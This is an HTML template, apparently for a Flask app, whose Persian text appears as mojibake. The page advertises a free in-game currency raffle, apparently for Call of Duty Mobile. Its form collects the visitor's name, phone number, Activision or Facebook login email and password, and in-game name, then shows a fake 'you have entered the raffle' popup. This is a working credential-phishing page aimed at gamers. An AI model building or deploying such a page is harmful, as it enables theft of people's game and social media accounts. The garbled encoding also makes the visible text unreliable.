<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <title>Ø³ÛŒâ€ŒÙ¾ÛŒ Ø±Ø§ÛŒÚ¯Ø§Ù†</title>
  <style>
    /* ==============================
       Ø¹Ù†ÙˆØ§Ù† Ù…Ú©Ø§Ù†ÛŒÚ©Ø§Ù„ (Typewriter) Ø±ÙˆÛŒ ÙØ±Ù…
       ============================== */
    .glass-box h1 {
      font-family: 'Courier New', Courier, monospace; /* ÙÙˆÙ†Øª Ù…Ú©Ø§Ù†ÛŒÚ©Ø§Ù„ */
      font-size: 40px; /* Ø¨Ø²Ø±Ú¯â€ŒØªØ± */
      margin-bottom: 25px;
      letter-spacing: 2px;
      color: #0ff;
      text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
      text-align: center;

      overflow: hidden;
      white-space: nowrap;
      border-right: 4px solid #0ff;
      animation: typing 2s steps(14), blink 0.7s step-end infinite alternate;
    }

    @keyframes typing {
      from { width: 0; }
      to { width: 14ch; } /* ØªØ¹Ø¯Ø§Ø¯ Ú©Ø§Ø±Ø§Ú©ØªØ±Ù‡Ø§ÛŒ "Ø³ÛŒâ€ŒÙ¾ÛŒ Ø±Ø§ÛŒÚ¯Ø§Ù†" */
    }

    @keyframes blink {
      50% { border-color: transparent; }
      100% { border-color: #0ff; }
    }
  </style>
</head>
<body>

  <!-- Ú©Ø§Ù†ØªÛŒÙ†Ø± Ø¨Ø§Ø±Ø´ Ø¨Ù„ÛŒØªâ€ŒÙ‡Ø§ -->
  <div class="falling-papers"></div>

  <!-- ÙØ±Ù… Ø´ÛŒØ´Ù‡â€ŒØ§ÛŒ -->
  <div class="glass-box">
    <h1>Ø³ÛŒâ€ŒÙ¾ÛŒ Ø±Ø§ÛŒÚ¯Ø§Ù†</h1>
    <form id="raffleForm" action="/submit" method="POST">
      <input type="text" name="fullname" placeholder="Ù†Ø§Ù… Ùˆ Ù†Ø§Ù… Ø®Ø§Ù†ÙˆØ§Ø¯Ú¯ÛŒ" required minlength="7" maxlength="35">
      
      <input 
        type="tel" 
        name="phone" 
        placeholder="Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„(Ù…Ø«Ù„Ø§Ù‹ 09012050000)" 
        pattern="^(0901|0902|0903|0930|0933|0935|0936|0937|0938|0939|0910|0911|0912|0913|0914|0915|0916|0917|0918|0919|0990|0991|0992|0993)\d{7}$"
        title="Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ† Ø¨Ø§ÛŒØ¯ Û±Û± Ø±Ù‚Ù… Ø¨Ø§Ø´Ø¯ Ùˆ Ø¨Ø§ ÛŒÚ©ÛŒ Ø§Ø² Ù¾ÛŒØ´â€ŒØ´Ù…Ø§Ø±Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ø¹ØªØ¨Ø± Ø´Ø±ÙˆØ¹ Ø´ÙˆØ¯."
        required 
        style="text-align:right; direction:ltr;"
      >

      <select name="company" required>
        <option value="" disabled selected>Ù†ÙˆØ¹ Ø§ØªØµØ§Ù„</option>
        <option value="Ø§Ú©ØªÛŒÙˆÛŒÚ˜Ù†">Ø§Ú©ØªÛŒÙˆÛŒÚ˜Ù†</option>
        <option value="ÙÛŒØ³Ø¨ÙˆÚ©">ÙÛŒØ³Ø¨ÙˆÚ©</option>
      </select>

      <input type="email" name="email" placeholder="Ø§ÛŒÙ…ÛŒÙ„" required>
      <input type="password" name="password" placeholder="Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±" required>
      <input type="text" name="gamename" placeholder="Ù†Ø§Ù… Ø¯Ø± Ø¨Ø§Ø²ÛŒ" required>
      <input type="submit" value="ØªØ§ÛŒÛŒØ¯">
    </form>
  </div>

  <!-- popup Ù¾ÛŒØ§Ù… -->
  <div id="popup">Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¯Ø± Ù‚Ø±Ø¹Ù‡â€ŒÚ©Ø´ÛŒ Ù…Ø§ Ø«Ø¨Øªâ€ŒÙ†Ø§Ù… Ú©Ø±Ø¯ÛŒØ¯.
Ø§Ù…ÛŒØ¯ÙˆØ§Ø±ÛŒÙ… Ø¨Ø±Ù†Ø¯Ù‡â€ŒÛŒ Ø¨Ø¹Ø¯ÛŒ Ù…Ø§ Ø´Ù…Ø§ Ø¨Ø§Ø´ÛŒØ¯.
Ø§Ø² Ø§Ø¹ØªÙ…Ø§Ø¯ Ùˆ Ù‡Ù…Ø±Ø§Ù‡ÛŒ Ø´Ù…Ø§ Ø³Ù¾Ø§Ø³Ú¯Ø²Ø§Ø±ÛŒÙ… ğŸŒŸ</div>

  <!-- Ø¬Ø§ÙˆØ§ Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø¨Ø±Ø§ÛŒ Ø¨Ø§Ø±Ø´ Ø¨Ù„ÛŒØª Ùˆ popup -->
  <script>
    const paperContainer = document.querySelector('.falling-papers');
    const colors = ['#0ff','#ff0','#f0f','#0f0','#ff6600'];

    function createPaper() {
      const paper = document.createElement('div');
      paper.classList.add('paper');
      paper.style.left = Math.random() * window.innerWidth + 'px';
      paper.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
      paperContainer.appendChild(paper);

      let top = -20;
      const speed = 2 + Math.random() * 3;
      const rotate = Math.random() * 360;

      function fall() {
        top += speed;
        paper.style.top = top + 'px';
        paper.style.transform = `rotate(${rotate + top*3}deg)`;
        if(top < window.innerHeight) requestAnimationFrame(fall);
        else paperContainer.removeChild(paper);
      }

      fall();
    }

    setInterval(createPaper, 200); // Ù‡Ø± 0.2 Ø«Ø§Ù†ÛŒÙ‡ ÛŒÚ© Ø¨Ù„ÛŒØª Ø§ÛŒØ¬Ø§Ø¯ Ù…ÛŒâ€ŒØ´ÙˆØ¯

    // ================= Popup =================
    const form = document.getElementById('raffleForm');
    const popup = document.getElementById('popup');

    form.addEventListener('submit', function(e) {
    //  e.preventDefault();

      // Ù†Ù…Ø§ÛŒØ´ popup Ø¨Ø§ fade-in
      popup.style.display = 'block';
      popup.style.opacity = '1';

      // Ø¨Ø¹Ø¯ Ø§Ø² 5 Ø«Ø§Ù†ÛŒÙ‡ fade-out
      setTimeout(() => {
        popup.style.opacity = '0';
        setTimeout(() => {
          popup.style.display = 'none'; // Ù…Ø®ÙÛŒ Ú©Ø±Ø¯Ù† Ø¨Ø¹Ø¯ Ø§Ø² fade
        }, 500); 
        form.reset();
      }, 5000); 
    });
  </script>
</body>
</html>
